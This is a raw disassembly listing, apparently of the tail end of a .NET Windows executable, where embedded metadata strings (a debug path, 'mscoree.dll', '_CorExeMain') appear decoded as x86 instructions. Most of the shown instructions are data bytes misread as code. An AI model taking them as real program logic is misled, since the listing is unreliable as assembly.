  404a0c:	fs aaa 
  404a0e:	bound  sp,DWORD PTR [ecx+0x63]
  404a12:	xor    al,0x36
  404a14:	aaa    
  404a15:	popa   
  404a16:	xor    eax,0x62653630
  404a1b:	popa   
  404a1c:	xor    bh,BYTE PTR [ecx]
  404a1e:	gs xor al,0x36
  404a21:	aaa    
  404a22:	popa   
  404a23:	cmp    BYTE PTR [edi],dh
  404a25:	xor    DWORD PTR [ecx],edi
  404a27:	cmp    BYTE PTR [edx+0x30],ah
  404a2a:	xor    eax,0x34376333
  404a2f:	cmp    DWORD PTR [ecx+0x61],esp
  404a32:	xor    ah,BYTE PTR [ecx+0x34]
  404a35:	xor    bh,BYTE PTR fs:[eax]
  404a38:	xor    al,0x30
  404a3a:	arpl   WORD PTR [edi],si
  404a3c:	cmp    BYTE PTR [eiz*2+0x6436],dh
  404a43:	push   ds
  404a44:	add    DWORD PTR [eax],eax
  404a46:	add    DWORD PTR [eax],eax
  404a48:	push   esp
  404a49:	add    dl,BYTE PTR [esi]
  404a4b:	push   edi
  404a4c:	jb     0x404aaf
  404a4e:	jo     0x404a9e
  404a50:	outs   dx,DWORD PTR ds:[esi]
  404a51:	outs   dx,BYTE PTR ds:[esi]
  404a52:	inc    ebp
  404a53:	js     0x404ab8
  404a55:	gs jo  0x404acc
  404a58:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  404a5f:	ja     0x404ad4
  404a61:	add    DWORD PTR [eax],ecx
  404a63:	add    DWORD PTR [eax],eax
  404a65:	add    al,BYTE PTR [eax]
  404a67:	add    BYTE PTR [eax],al
  404a69:	add    BYTE PTR [eax],al
  404a6b:	or     BYTE PTR [ecx],al
  404a6d:	add    BYTE PTR [eax],cl
	...
  404a77:	add    cl,ah
  404a79:	ficom  WORD PTR [ecx]
  404a7b:	push   eax
  404a7c:	add    BYTE PTR [eax],al
  404a7e:	add    BYTE PTR [eax],al
  404a80:	add    al,BYTE PTR [eax]
  404a82:	add    BYTE PTR [eax],al
  404a84:	sbb    al,0x1
  404a86:	add    BYTE PTR [eax],al
  404a88:	nop
  404a89:	dec    edx
  404a8a:	add    BYTE PTR [eax],al
  404a8c:	nop
  404a8d:	sub    al,0x0
  404a8f:	add    BYTE PTR [edx+0x53],dl
  404a92:	inc    esp
  404a93:	push   ebx
  404a94:	ss loop 0x404a75
  404a97:	lea    edx,[eax+0x7c]
  404a9a:	sbb    eax,0x20118f4d
  404a9f:	and    BYTE PTR [ebx],cl
  404aa1:	stos   DWORD PTR es:[edi],eax
  404aa2:	pop    edx
  404aa3:	in     eax,dx
  404aa4:	add    DWORD PTR [eax],eax
  404aa6:	add    BYTE PTR [eax],al
  404aa8:	data16 cmp bl,BYTE PTR [edx+eiz*2+0x69]
  404aad:	outs   dx,BYTE PTR ds:[esi]
  404aae:	popa   
  404aaf:	jb     0x404b1a
  404ab1:	gs jae 0x404b10
  404ab4:	dec    ecx
  404ab5:	outs   dx,BYTE PTR ds:[esi]
  404ab6:	je     0x404b1d
  404ab8:	jb     0x404b27
  404aba:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x6f435c65
  404ac3:	outs   dx,BYTE PTR ds:[esi]
  404ac4:	arpl   WORD PTR [ebp+0x72],si
  404ac7:	jb     0x404b2e
  404ac9:	outs   dx,BYTE PTR ds:[esi]
  404aca:	arpl   WORD PTR [ecx+0x56],di
  404acd:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  404ad4:	gs jb  0x404b33
  404ad7:	jb     0x404b3a
  404ad9:	jp     0x404b55
  404adb:	ins    BYTE PTR es:[edi],dx
  404adc:	gs cs popa 
  404adf:	outs   dx,BYTE PTR ds:[esi]
  404ae0:	popa   
  404ae1:	ins    BYTE PTR es:[edi],dx
  404ae2:	jns    0x404b57
  404ae4:	imul   esi,DWORD PTR [ebx+0x73],0x69767265
  404aeb:	arpl   WORD PTR [ebp+0x2e],sp
  404aee:	arpl   WORD PTR [ebx+0x70],si
  404af1:	jb     0x404b62
  404af3:	push   0x5f
  404af5:	xor    DWORD PTR [ebx+esi*1],esi
  404af8:	xor    esi,DWORD PTR [edi]
  404afa:	aaa    
  404afb:	ss xor al,0x36
  404afe:	xor    DWORD PTR [edi+ebp*2+0x62],ebx
  404b02:	push   0x72
  404b04:	pop    esp
  404b05:	js     0x404b3f
  404b07:	ss pop esp
  404b09:	inc    ebx
  404b0a:	push   esi
  404b0b:	inc    ecx
  404b0c:	outs   dx,BYTE PTR ds:[esi]
  404b0d:	popa   
  404b0e:	ins    BYTE PTR es:[edi],dx
  404b0f:	jns    0x404b84
  404b11:	imul   esi,DWORD PTR [ebx+0x53],0x69767265
  404b18:	arpl   WORD PTR [ebp+0x2e],sp
  404b1b:	jo     0x404b81
  404b1d:	bound  eax,QWORD PTR [eax]
	...
  404bab:	add    ah,dl
  404bad:	dec    ebx
	...
  404bb6:	add    BYTE PTR [eax],al
  404bb8:	out    dx,al
  404bb9:	dec    ebx
  404bba:	add    BYTE PTR [eax],al
  404bbc:	add    BYTE PTR [eax],ah
	...
  404bd2:	add    BYTE PTR [eax],al
  404bd4:	loopne 0x404c21
	...
  404be2:	pop    edi
  404be3:	inc    ebx
  404be4:	outs   dx,DWORD PTR ds:[esi]
  404be5:	jb     0x404c2c
  404be7:	js     0x404c4e
  404be9:	dec    ebp
  404bea:	popa   
  404beb:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  404bf2:	jb     0x404c59
  404bf4:	gs cs fs ins BYTE PTR es:[edi],dx
  404bf8:	ins    BYTE PTR es:[edi],dx
  404bf9:	add    BYTE PTR [eax],al
  404bfb:	add    BYTE PTR [eax],al
  404bfd:	add    bh,bh
  404bff:	and    eax,0x402000
